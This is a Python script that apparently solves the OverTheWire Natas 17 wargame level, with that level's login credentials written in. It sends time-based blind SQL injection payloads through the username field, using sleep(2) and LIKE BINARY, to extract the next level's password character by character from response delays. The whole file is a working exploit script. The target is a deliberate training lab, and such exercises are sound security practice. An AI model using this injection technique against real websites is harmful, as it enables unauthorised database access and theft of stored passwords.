import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered_chars = ''
passwordlist= []
query = {'username' : ''}

natasURL = 'http://natas17.natas.labs.overthewire.org/'

natas_usr   = 'natas17'
natas_pword = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
login=(natas_usr,natas_pword)

####Find the list of chars in pword
##for ch in chars:
##    query['username'] = 'natas18" and password LIKE "%' + ch +'%" and sleep(2) # '
##    start = time.time()
##    r = requests.request(method ='POST', url=natasURL, data = query, auth=login)
##    end = time.time()
##    if (end-start) > 2.0:
##        passwordlist.append(ch)
##        print("Password Dictionary: " + json.dumps(passwordlist))
##    else : print(ch + " is not in the password")

passwordlist = ["c", "d", "f", "g", "h", "i", "j", "k", "l", "m", "o", "p", "q", "r", "s", "v", "w", "x", "y", "C", "D", "F", "G", "H", "I", "J", "K", "L", "M", "O", "P", "Q", "R", "S", "V", "W", "X", "Y", "0", "4", "7"]

# Test the possible chars in order:
password = ''

for i in range(1,33):
    for ch in passwordlist:
        crt_pword = ''.join([password,ch])
        query['username'] = 'natas18" and password LIKE BINARY"' + crt_pword +'%" and sleep(2) # '
        start = time.time()
        r = requests.request(method ='POST', url=natasURL, data = query, auth=login)
        end = time.time()
        if (end-start) > 2.0:
            password = crt_pword
            print("Password " + str(i) + ": " + password )
            break

